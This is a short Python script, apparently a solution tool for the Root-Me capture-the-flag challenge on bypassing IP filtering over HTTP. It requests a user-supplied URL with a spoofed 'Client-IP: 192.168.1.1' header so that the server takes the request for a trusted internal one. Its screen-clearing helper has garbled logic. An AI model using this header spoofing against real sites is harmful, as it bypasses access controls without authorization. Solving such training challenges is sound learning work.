#!/usr/bin/env python

import requests, os

def clean():

	os.system('cls')

	if os.name != 'nt':
		os.system('clear')
	else:
		print('Error..')

def msg():
	print('\nOutil pour le challenge --> Root-Me / HTTP - Contournement de filtrage IP')

def main():
	
	url = input('\n[*] URL: ')

	r = requests.get(url, headers={'Client-IP':'192.168.1.1'})

	if r.status_code == 200:
		print(r.text)
	else:
		print('Error')

if __name__ == '__main__':
	clean()
	msg()
	main()